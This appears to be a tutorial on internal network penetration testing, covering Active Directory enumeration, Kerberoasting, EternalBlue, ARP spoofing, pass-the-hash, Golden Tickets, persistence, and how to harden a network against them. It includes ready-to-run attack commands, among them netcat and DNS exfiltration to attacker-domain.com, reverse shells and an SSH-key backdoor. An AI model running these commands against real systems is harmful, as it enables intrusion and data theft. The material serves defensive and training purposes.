What is Internal Network Penetration Testing?

Internal network penetration testing simulates an attacker who has already breached the perimeter — operating from inside the corporate network with the same access level as a malicious insider, a compromised endpoint, or a threat actor who pivoted through an external vulnerability. The question it answers is brutally direct: if someone is already inside, how bad can it get?

Unlike external testing (which focuses on internet-facing systems), internal testing explores the organisation's internal trust relationships, Active Directory configuration, unpatched internal services, lateral movement pathways, and the depth of access that can be achieved from a standard domain-user starting position. In most mature organisations, the answer is alarming — full domain compromise is achievable in the majority of internal engagements within hours of starting.

[ i ]

According to Mandiant's M-Trends report, the median dwell time — the period between an attacker's initial access and detection — is 16 days globally. During that window, an attacker with internal network access can achieve full domain compromise, establish persistent backdoors, and exfiltrate sensitive data multiple times before any alert is triggered. Internal pen testing compresses that entire kill chain into a controlled exercise.

[ ⚠ ]

Authorised Use Only. Internal penetration testing requires explicit written authorisation from the organisation's leadership. Define scope (IP ranges, excluded systems, testing hours), obtain a signed Rules of Engagement document, and confirm a 24/7 escalation contact before any testing begins. Connecting an unauthorised device to a corporate network is illegal regardless of intent.

Internal Threat Model & Starting Positions

Internal testing begins with a clearly defined starting position that determines which threat scenario is being simulated. The starting position dramatically changes what is achievable and how quickly — a fully credentialed domain user can enumerate Active Directory immediately, while an unauthenticated attacker must first establish a foothold before any AD enumeration is possible. Choosing the right starting position for each engagement ensures the test simulates a realistic and meaningful threat scenario.

01
Unauthenticated — Network Access Only
Simulates a rogue device plugged into an ethernet port, a compromised IoT device, or an attacker who bypassed physical security. No credentials provided. Testing begins from a network connection with no prior knowledge — most realistic but slowest to yield results. Focuses on unauthenticated service exploitation and credential capture via MITM.
BASIC
02
Standard Domain User
Simulates a malicious employee, a compromised contractor workstation, or an attacker who has captured a single set of low-privilege credentials (e.g. via phishing or external breach). The most common and most realistic starting position for modern internal assessments — a domain user account can enumerate the entire Active Directory structure.
STANDARD
03
Privileged Insider / IT Staff
Simulates a malicious IT administrator, a helpdesk account compromised by an attacker, or an insider with elevated but not full domain admin privileges. Tests what a trusted but not all-powerful insider can access — often revealing that IT staff accounts have unnecessary access to sensitive systems and credentials due to privilege creep over time.
ELEVATED
04
Assume Breach — Post-Compromise
Begins from the assumption that an attacker has already compromised a workstation and has local administrator access to that machine. Tests lateral movement capability, detection effectiveness, and how far damage can propagate from a single compromised endpoint. Focuses the engagement on post-exploitation rather than initial access.
CRITICAL

Phase I — Pre-Engagement & Network Discovery

Internal pre-engagement goes beyond scope paperwork — it determines the testing approach (black-box vs grey-box vs credentialed), negotiates whitelisting with the security team (so EDR doesn't terminate the test prematurely), and defines which business-critical systems require careful handling to avoid unintended disruption. Network topology documentation, where available, dramatically accelerates enumeration by identifying high-value targets before scanning begins.

Pre-Engagement Checklist
  • Scope IP Ranges — Document all in-scope subnets explicitly. Exclude production databases, OT/ICS systems, and life-safety systems unless specifically authorised with risk-acceptance sign-off.
  • Test Type — Credentialed (fastest, most comprehensive) vs non-credentialed (most realistic, slower). Agree upfront — late-stage scope changes waste engagement time.
  • EDR/AV Whitelisting — Decide whether testing tools are whitelisted from EDR. Whitelisting gives a cleaner vulnerability picture but underestimates detection capability; no whitelisting tests both simultaneously.
  • Network Topology — Obtain a high-level network diagram if available. Key targets: Domain Controllers, jump hosts, hypervisors, certificate authority servers, backup infrastructure.
  • Testing Hours — Define whether testing is 24/7 or business-hours only. After-hours testing catches systems that are only live during off-hours but may impact staff the next morning.
  • Emergency Kill Switch — Define the escalation procedure and a word/signal that immediately halts all testing activity if an unintended impact is detected.

Phase II — Scanning, Enumeration & AD Mapping

Internal scanning is categorically different from external scanning — the tester is operating from a trusted network position with direct access to every internal service. Active Directory enumeration is the highest-priority task: the AD database contains the complete map of every user, machine, group membership, trust relationship, and delegation configuration in the organisation. BloodHound transforms this data into a visual attack graph — automatically identifying the shortest path from any starting user to Domain Admin.

# Step 1: Fast host discovery — find all live hosts in the subnet nmap -sn 192.168.1.0/24 -oG live_hosts.txt # Step 2: Stealth SYN scan across all ports on discovered hosts nmap -sS -p- 192.168.1.0/24 -T4 --open -oA internal_full # Step 3: Aggressive service/version/OS detection on interesting hosts nmap -A -T4 -p- 192.168.1.100 -oN host_detail.txt # Scan for specific high-value internal services nmap -sV -p 88,135,139,389,445,464,636,3268,3269,3389,5985,5986 \ 192.168.1.0/24 # Kerberos, RPC, NetBIOS, LDAP, SMB, RDP, WinRM # SMB vulnerability checks on internal hosts nmap --script smb-vuln-ms17-010,smb-security-mode,smb-enum-shares \ -p 445 192.168.1.0/24

Phase III — Exploitation

Internal exploitation targets the services, misconfigurations, and vulnerabilities discovered during scanning. The internal network presents a dramatically larger and more diverse exploitation surface than the external perimeter — unpatched internal servers (often missed by patch management because they are "not internet-facing"), SMB vulnerabilities, Kerberos weaknesses, MITM opportunities, and authentication relay attacks are all available simultaneously. EternalBlue (MS17-010) remains exploitable in a significant proportion of internal engagements despite being disclosed in 2017.

⟩ Kerberoasting — Service Account Credential Theft
Any authenticated domain user can request a Kerberos TGS ticket for any account with a registered Service Principal Name (SPN). These tickets are encrypted with the service account's password hash and can be cracked offline — completely silently, with no failed authentication events logged. Service accounts are frequently configured with weak static passwords and high privileges, making successful Kerberoasting one of the most impactful and common internal findings.
# Request TGS tickets for all Kerberoastable accounts GetUserSPNs.py corp.local/domainuser:Password123 \ -dc-ip 192.168.1.10 -request -outputfile kerberoast_hashes.txt # Crack TGS hashes offline — mode 13100 for Kerberos 5 TGS-REP hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt --force # From Windows with PowerView — request and save ticket Invoke-Kerberoast -OutputFormat HashCat | Out-File kerb_hashes.txt # AS-REP Roasting — users with "Do not require Kerberos pre-authentication" set GetNPUsers.py corp.local/ -usersfile users.txt -dc-ip 192.168.1.10 \ -format hashcat -outputfile asrep_hashes.txt hashcat -m 18200 asrep_hashes.txt rockyou.txt # Mode 18200 for AS-REP
⟩ EternalBlue & SMB Exploitation
MS17-010 (EternalBlue) exploits a critical buffer overflow in Windows' SMBv1 implementation, enabling remote code execution as SYSTEM without any authentication. Despite being disclosed in 2017 and patched immediately, it remains exploitable in a significant portion of internal assessments — particularly against legacy systems, unmanaged devices, and environments where patch management processes have gaps. Identifying vulnerable internal hosts via Nmap NSE scripts confirms exploitability before committing to exploitation attempts.
# Step 1: Identify vulnerable hosts (safe check — no exploitation) nmap --script smb-vuln-ms17-010 -p 445 192.168.1.0/24 # Step 2: Exploit via Metasploit use exploit/windows/smb/ms17_010_eternalblue set RHOSTS 192.168.1.50 set PAYLOAD windows/x64/meterpreter/reverse_tcp set LHOST <ATTACKER-IP> set LPORT 4444 check # Verify vulnerable before exploiting exploit # CrackMapExec — SMB authentication and share enumeration at scale crackmapexec smb 192.168.1.0/24 -u domainuser -p Password123 --shares crackmapexec smb 192.168.1.0/24 -u Administrator -H <NTLM_HASH>
⟩ MITM — ARP Spoofing & Credential Interception
ARP spoofing exploits the stateless nature of the ARP protocol — by broadcasting forged ARP replies associating the attacker's MAC address with the gateway's IP, all traffic from target machines is routed through the attacker before reaching its destination. This enables interception of unencrypted credentials, session tokens, and sensitive data. On networks without Dynamic ARP Inspection (DAI), this attack is trivial to execute and completely undetected by standard monitoring.
# Enable IP forwarding — essential so traffic flows through the attacker echo 1 > /proc/sys/net/ipv4/ip_forward # ARP spoof between target and gateway simultaneously arpspoof -i eth0 -t 192.168.1.50 192.168.1.1 & # Target believes we are GW arpspoof -i eth0 -t 192.168.1.1 192.168.1.50 & # GW believes we are target # Capture all traffic passing through the attacker position tcpdump -i eth0 -w mitm_capture.pcap # Use Bettercap for automated MITM with credential extraction bettercap -iface eth0 # Inside bettercap: net.probe on; arp.spoof.targets 192.168.1.50; arp.spoof on; net.sniff on # SSL stripping — downgrade HTTPS to HTTP where HSTS is not enforced mitmproxy --mode transparent -p 8080

Phase IV — Privilege Escalation

Privilege escalation bridges the gap between initial access and full system control. On Windows, this means reaching SYSTEM or Domain Admin; on Linux, reaching root. Automated tools like WinPEAS and LinPEAS systematically enumerate hundreds of known escalation vectors — misconfigured services, world-writable paths, unquoted service paths, token privileges, stored credentials, and kernel vulnerabilities — in minutes. The output is dense and must be carefully triaged, prioritising quick wins like unquoted service paths and stored credential files before kernel exploits that risk system instability.

Phase V — Lateral Movement & Post-Exploitation

Lateral movement is the systematic expansion of access from the initial compromise across the internal network — using captured credentials, Kerberos ticket abuse, and remote execution techniques to move from machine to machine without triggering authentication alerts. The objective is to reach the highest-value targets: Domain Controllers, financial systems, databases, and backup infrastructure. BloodHound's attack path visualisation makes lateral movement planning surgical — showing the exact sequence of hops needed to reach Domain Admin from any starting position.

# Pass-the-Hash — authenticate using NTLM hash, no plaintext needed crackmapexec smb 192.168.1.0/24 \ -u Administrator -H aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH> # Remote code execution via PtH with psexec.py psexec.py -hashes aad3b435:<NTLM_HASH> Administrator@192.168.1.50 # WMI-based remote execution — quieter than psexec (no service creation) wmiexec.py -hashes aad3b435:<NTLM_HASH> Administrator@192.168.1.50 # Pass-the-Ticket — inject Kerberos ticket into current session mimikatz "sekurlsa::tickets /export" # Export all tickets mimikatz "kerberos::ptt Administrator@corp.local.kirbi" # Overpass-the-Hash — convert NTLM hash to Kerberos TGT mimikatz "sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:<HASH> /run:powershell.exe"
# Remote Desktop Protocol — full GUI access to target xfreerdp /u:Administrator /p:Password123 /v:192.168.1.50 # WinRM — PowerShell remoting (port 5985/5986) evil-winrm -i 192.168.1.50 -u Administrator -p Password123 evil-winrm -i 192.168.1.50 -u Administrator -H <NTLM_HASH> # SMB-based remote execution via Impacket PsExec psexec.py corp.local/Administrator:Password123@192.168.1.50 # CrackMapExec — execute commands across the entire domain crackmapexec smb 192.168.1.0/24 -u Administrator -p Password123 -x "whoami" crackmapexec smb 192.168.1.0/24 -u Administrator -p Password123 --sam # Dump SAM hashes # Golden Ticket — forge Kerberos TGT with krbtgt hash (no expiry) mimikatz "kerberos::golden /domain:corp.local /sid:S-1-5-21-... /krbtgt:<HASH> /user:FakeAdmin /ticket:golden.kirbi" mimikatz "kerberos::ptt golden.kirbi"

Phase VI — Data Exfiltration & Persistence

Exfiltration demonstrates the full business impact of the compromise — what data an attacker can extract and through which channels. Persistence demonstrates how an attacker would maintain access across reboots, password resets, and account lockouts. Both phases are conducted with explicit scope approval and documented precisely — in a real engagement, the attacker performs these actions silently over weeks; in a penetration test, the objective is demonstrating the capability exists, not actually exfiltrating production data at scale.

# Direct file exfiltration via Netcat — simple and fast on permissive networks # Attacker: listen for incoming data nc -lvnp 4444 > received_data.txt # Victim: send data to attacker nc -w 3 192.168.1.200 4444 < sensitive_data.txt # DNS exfiltration — bypasses most network monitoring (port 53 almost never blocked) # Encode data in DNS queries to attacker-controlled domain cat secrets.txt | base64 | while read chunk; do nslookup "$chunk.attacker-domain.com" 8.8.8.8 done # DNSCat2 — full interactive shell tunnelled through DNS queries dnscat2-server attacker-domain.com # Server side ./dnscat2 --dns domain=attacker-domain.com # Client side on victim # ICMP exfiltration — data hidden in ICMP echo request payloads ptunnel -p <ATTACKER-IP> -lp 8080 -da <INTERNAL-HOST> -dp 22
# Windows — registry run key persistence (survives reboot) reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" \ /v WindowsUpdate /t REG_SZ /d "C:\Users\Public\beacon.exe" /f # Windows — scheduled task (runs as SYSTEM if created with admin) schtasks /create /tn "WindowsDefenderUpdate" \ /tr "C:\Users\Public\beacon.exe" /sc onstart /ru SYSTEM /f # Linux — cron persistence (survives reboot) echo "@reboot /tmp/.hidden/beacon &" | crontab - # Linux — SSH key backdoor (survives password changes) echo "ssh-rsa <ATTACKER_PUBKEY>" >> /root/.ssh/authorized_keys # Meterpreter persistence module (documented for assessment evidence) use post/windows/manage/persistence_exe set SESSION 1 run # ALWAYS document and remove all persistence mechanisms post-engagement # Provide client with exact cleanup commands to reverse every change made

AI Integration in Internal Network Penetration Testing

AI fundamentally accelerates internal network penetration testing -- compressing hours of manual BloodHound analysis and credential triage into minutes, generating targeted attack chains from network scan data, interpreting complex Windows event logs and NTLM challenge-response captures, and automating the most tedious aspects of post-exploitation enumeration. Internal network tests produce enormous volumes of data (Nessus XML, BloodHound JSON, Responder captures, WMI output) that AI can correlate and reason about at a depth no manual analysis can match in comparable time.

The critical shift: AI tools like Claude and ChatGPT understand Active Directory relationships, Windows privilege model, and Kerberos protocol deeply enough to serve as expert internal pentest advisors -- generating NTLM relay strategies, BloodHound Cypher queries, and post-exploitation command sequences tailored to the specific environment discovered during enumeration.

[ AI ]

Internal network penetration testers using AI-assisted BloodHound analysis identify the shortest path to Domain Admin in seconds rather than hours of manual Cypher query refinement. AI processes full BloodHound JSON exports, correlates attack paths, ranks them by stealth and exploitability, and generates the exact Impacket and PowerView commands for each step -- replacing the most expert-dependent phase of AD pentesting with guided automation.

Defence — Internal Network Hardening

Internal network hardening addresses the attack vectors that internal penetration tests consistently exploit. The controls below are ordered by impact — implementing them systematically eliminates the most frequently successful internal attack paths. The combination of network segmentation, credential hygiene, Active Directory hardening, and AI-driven detection creates a layered defence that forces attackers to work significantly harder for every step of the kill chain.

Active Directory Hardening
Audit and remediate Kerberoastable service accounts — enforce 25+ character random passwords via Group Managed Service Accounts (gMSA). Eliminate unconstrained delegation. Remove unnecessary ACL permissions. Enable Protected Users Security Group for Tier-0 accounts. Audit and restrict DA membership quarterly.
Credential Protection
Enable Credential Guard to prevent LSASS credential extraction. Disable NTLMv1 domain-wide. Enable Protected Users group for privileged accounts — prevents NTLM authentication, prevents credential caching. Deploy LAPS for randomised local administrator passwords across all workstations, eliminating PTH lateral movement via shared local credentials.
Network Segmentation
Implement micro-segmentation — workstations must not communicate with each other directly. Server VLANs with strict ACLs. Dedicated AD tier model — Tier-0 (DCs), Tier-1 (Servers), Tier-2 (Workstations) with no cross-tier admin credentials. This eliminates most lateral movement paths by eliminating the network reachability that enables them.
Disable Legacy Protocols
Disable LLMNR, NetBIOS-NS, and WPAD — these broadcast protocols are the foundation of Responder-based credential capture. Disable NTLMv1. Disable SMBv1 entirely. Enforce SMB signing to prevent relay attacks. These four controls eliminate an entire category of credential capture and relay attacks at zero cost.
Privileged Access Management
Implement a Privileged Access Workstation (PAW) model — all Domain Admin activity occurs only from dedicated hardened workstations that have no internet access and no standard user activity. Deploy a privileged identity management (PIM) platform with just-in-time privileged access — DA rights granted for a 1-hour window, not permanently assigned.
AI-Driven Internal Monitoring
Deploy UEBA (Microsoft Sentinel, Splunk UBA, or Exabeam) to baseline user behaviour and alert on deviations. Enable advanced audit policies — log Kerberos TGS requests to detect Kerberoasting, enable Sysmon to capture process creation, network connections, and credential access events. Integrate with a SIEM with AI correlation rules.
Windows Hardening
  • Enable Windows Credential Guard — prevents LSASS memory extraction by Mimikatz and similar tools
  • Deploy Local Administrator Password Solution (LAPS) — unique local admin passwords eliminate PTH lateral movement
  • Enable SMB Signing on all hosts — prevents NTLM relay attacks via Responder + ntlmrelayx
  • Apply PowerShell Constrained Language Mode and logging — limits and records PowerShell-based attacks
Active Directory Controls
  • Enforce Tiered Administration Model — Tier-0 credentials never touch Tier-1 or Tier-2 systems, ever
  • Audit Kerberoastable SPNs quarterly — any service account with SPN must have a 25+ char random password
  • Enable Protected Users Security Group for all Domain Admins and EA accounts
  • Run BloodHound regularly as a blue team tool — find your own attack paths before attackers do
AI-Enhanced Detection
  • Deploy UEBA with ML behavioural baselining — detect lateral movement by anomalous authentication patterns
  • Enable Microsoft Defender for Identity — AI-native detection of PtH, PtT, DCSync, Golden Ticket, and Kerberoasting
  • Integrate Sysmon + AI SIEM correlation — correlate process creation, network connection, and credential events across hosts
  • Deploy AI-managed honeytokens (CanaryTokens, Thinkst Canary) — instant alert when lateral movement reaches decoy credentials
